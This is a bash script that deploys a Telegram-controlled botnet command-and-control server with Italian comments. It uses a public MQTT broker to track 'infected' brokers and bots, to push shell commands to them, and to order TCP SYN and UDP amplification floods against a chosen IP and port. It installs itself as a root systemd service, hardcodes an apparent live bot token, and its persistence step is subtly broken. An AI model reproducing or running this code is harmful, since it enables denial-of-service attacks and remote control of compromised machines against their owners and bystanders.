#!/bin/bash
# ================================================
# TG C2 MASTER - DEPLOY VPS (NO CAT - DIRECT)
# ================================================

TOKEN="8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe"
ADMIN_ID="5699538596"

echo "🚀 TG C2 MASTER DEPLOY..."

# PYTHON C2 DIRECT
python3 -c "
import telebot, paho.mqtt.client as mqtt, json, threading, re
TOKEN = '$TOKEN'
ADMIN_ID = '$ADMIN_ID'
bot = telebot.TeleBot(TOKEN)
brokers = {}
mqtt_brokers = {}

mqttc = mqtt.Client()
mqttc.reconnect_delay_set(1, 120)

def on_connect(client, userdata, flags, rc):
    print('✅ MQTT DISCOVERY START')
    mqttc.subscribe('hivemq/#')
    mqttc.subscribe('mosquitto/#')

def on_message(client, userdata, msg):
    global brokers, mqtt_brokers
    try:
        topic = msg.topic
        data = json.loads(msg.payload.decode())
        
        if 'connected_clients' in topic:
            broker_id = topic.split('/')[-1]
            clients = data.get('clients', 0)
            brokers[broker_id] = clients
            mqtt_brokers[broker_id] = topic.split('/')[0]
            total = sum(brokers.values())
            bot.send_message(ADMIN_ID, f'✅ INFECTED `{broker_id}` ({clients} clients)\\n📊 TOTAL: {len(brokers)} brokers {total} bots', parse_mode='Markdown')
            
        elif topic.endswith('/c2_result'):
            result = json.loads(msg.payload.decode())
            bot.send_message(ADMIN_ID, f'📤 {result[\"broker\"]} ```{result[\"output\"][:1900]}```', parse_mode='Markdown')
    except: pass

mqttc.on_connect = on_connect
mqttc.on_message = on_message

@bot.message_handler(commands=['start'])
def start(msg):
    if str(msg.chat.id) != ADMIN_ID: return
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton('⚡ TCPSYN', callback_data='tcpsyn'))
    markup.add(telebot.types.InlineKeyboardButton('🌊 UDP AMP', callback_data='udpamp'))
    markup.add(telebot.types.InlineKeyboardButton('📊 STATS', callback_data='stats'))
    markup.add(telebot.types.InlineKeyboardButton('📋 BROKERS', callback_data='brokers'))
    bot.send_message(msg.chat.id, '🚀 **TG C2 HIVEMQ INFECTOR**\nComandi: /shell CMD\n/kill', reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def cb(call):
    if str(call.message.chat.id) != ADMIN_ID: return
    if call.data == 'stats':
        total = sum(brokers.values())
        bot.answer_callback_query(call.id, f'Brokers: {len(brokers)}, Bots: {total}')
    elif call.data == 'brokers':
        txt = '📋 **BROKERS:**\\n'
        for b, c in brokers.items(): txt += f'• {b}: {c}\\n'
        bot.edit_message_text(txt, call.message.chat.id, call.message.id, parse_mode='Markdown')
    elif call.data in ['tcpsyn', 'udpamp']:
        bot.send_message(call.message.chat.id, f'🎯 Inserisci target: IP PORT\\nEs: 8.8.8.8 80')

@bot.message_handler(func=lambda m: m.chat.id == int(ADMIN_ID))
def cmd(msg):
    text = msg.text.strip()
    if text.startswith('/shell '):
        cmd = text[7:]
        for broker in mqtt_brokers:
            mqttc.publish(f'{mqtt_brokers[broker]}/c2/cmd', json.dumps({'cmd':'shell','payload':cmd}))
        bot.reply_to(msg, f'🖥️ SHELL → {len(brokers)} brokers')
    elif ' ' in text and len(text.split()) == 3:
        cmd_type, ip, port = text.split()
        if cmd_type.lower() in ['tcpsyn', 'udpamp']:
            payload = json.dumps({'cmd':cmd_type.lower(), 'target':ip, 'port':int(port)})
            for broker in mqtt_brokers:
                mqttc.publish(f'{mqtt_brokers[broker]}/c2/cmd', payload)
            bot.reply_to(msg, f'⚡ **{cmd_type}** {ip}:{port} → {len(brokers)}')

@bot.message_handler(commands=['kill'])
def kill(msg):
    if str(msg.chat.id) != ADMIN_ID: return
    for broker in mqtt_brokers: mqttc.publish(f'{mqtt_brokers[broker]}/c2/cmd', json.dumps({'cmd':'kill'}))
    bot.reply_to(msg, '🛑 KILL ALL')

print('🚀 TG C2 START - DISCOVERING BROKERS...')
threading.Thread(target=lambda: [mqttc.connect('broker.hivemq.com',1883,60),mqttc.loop_forever()], daemon=True).start()
bot.polling(none_stop=True)
"

# SYSTEMD PERSISTENZA
cat > /etc/systemd/system/tg-c2.service << EOF
[Unit]
Description=TG C2 Master
After=network.target
[Service]
ExecStart=/usr/bin/python3 -c 'exec(open("/opt/tg_c2_master.py").read())'
WorkingDirectory=/opt
Restart=always
User=root
[Install]
WantedBy=multi-user.target
EOF

echo "python3 -c \"$(cat /opt/tg_c2_master.py)\"" > /opt/tg_c2_master.py
chmod +x /opt/tg_c2_master.py

systemctl daemon-reload
systemctl enable tg-c2
systemctl restart tg-c2

echo "✅ C2 MASTER LIVE! Telegram /start"
echo "🔍 journalctl -f -u tg-c2"
